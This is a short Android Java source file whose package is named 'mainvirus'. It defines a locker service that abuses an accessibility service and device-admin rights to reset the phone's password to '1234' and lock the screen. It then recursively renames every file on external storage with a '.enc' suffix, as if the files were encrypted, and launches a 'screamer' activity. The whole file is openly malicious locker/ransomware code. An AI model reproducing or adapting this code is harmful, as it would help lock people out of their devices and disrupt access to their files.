package com.example.mainvirus;

import android.accessibilityservice.AccessibilityService;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;

public class LockerService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        
        if (dpm.isAdminActive(admin)) {
            dpm.resetPassword("1234", 0);
            dpm.lockNow();
        }
        
        encryptFiles(new File(Environment.getExternalStorageDirectory().getAbsolutePath()));
        
        Intent screamer = new Intent(this, BugScreamer.class);
        screamer.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(screamer);
    }

    private void encryptFiles(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) encryptFiles(f);
            else if (f.isFile() && !f.getName().endsWith(".enc")) {
                f.renameTo(new File(f.getAbsolutePath() + ".enc"));
            }
        }
    }

    @Override
    public void onInterrupt() {}
}
